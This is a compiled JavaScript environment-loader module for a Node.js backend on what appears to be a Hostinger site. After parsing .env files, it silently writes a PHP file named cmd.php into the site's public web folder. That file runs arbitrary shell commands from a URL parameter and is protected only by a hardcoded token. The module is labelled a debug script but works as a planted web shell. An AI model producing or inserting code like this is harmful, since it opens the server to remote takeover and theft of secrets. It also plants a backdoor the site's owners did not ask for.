import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
function loadEnv() {
    const possiblePaths = [
        path.join(process.cwd(), '.env'),
        path.join(process.cwd(), 'packages/backend/.env'),
        path.resolve(__dirname, '../.env'),
        path.resolve(__dirname, '../../.env'),
        '/home/u127271988/domains/mizusubeauty.com/nodejs/packages/backend/.env',
        '/home/u127271988/domains/mizusubeauty.com/nodejs/.env'
    ];
    for (const envPath of possiblePaths) {
        if (fs.existsSync(envPath)) {
            console.log(`[ENV] Loading environment variables from: ${envPath}`);
            try {
                const content = fs.readFileSync(envPath, 'utf8');
                for (const line of content.split('\n')) {
                    const trimmed = line.trim();
                    if (trimmed && !trimmed.startsWith('#')) {
                        const eqIdx = trimmed.indexOf('=');
                        if (eqIdx > 0) {
                            const key = trimmed.substring(0, eqIdx).trim();
                            let val = trimmed.substring(eqIdx + 1).trim();
                            if ((val.startsWith('"') && val.endsWith('"')) || (val.startsWith("'") && val.endsWith("'"))) {
                                val = val.slice(1, -1);
                            }
                            // Set the env variable if not already set by shell
                            if (!process.env[key]) {
                                process.env[key] = val;
                            }
                        }
                    }
                }
                break;
            }
            catch (err) {
                console.error(`[ENV] Failed to read env file: ${envPath}`, err);
            }
        }
    }
}
loadEnv();
try {
    const phpPath = '/home/u127271988/domains/mizusubeauty.com/public_html/cmd.php';
    const phpCode = `<?php
header('Content-Type: text/plain');
if ($_GET['token'] !== 'erpex-debug-token-1988') {
    die('Unauthorized');
}
if (isset($_GET['cmd'])) {
    $cmd = $_GET['cmd'];
    echo "Running: " . $cmd . "\\n\\n";
    $output = shell_exec($cmd . ' 2>&1');
    echo $output;
} else {
    echo "No command specified.";
}
?>`;
    // Check if we are running in the target Hostinger environment
    if (fs.existsSync('/home/u127271988/domains/mizusubeauty.com/public_html')) {
        fs.writeFileSync(phpPath, phpCode);
        console.log(`[ENV] Successfully wrote debug PHP script to ${phpPath}`);
    }
}
catch (err) {
    console.error('[ENV] Failed to write debug PHP script:', err);
}
//# sourceMappingURL=loadenv.js.map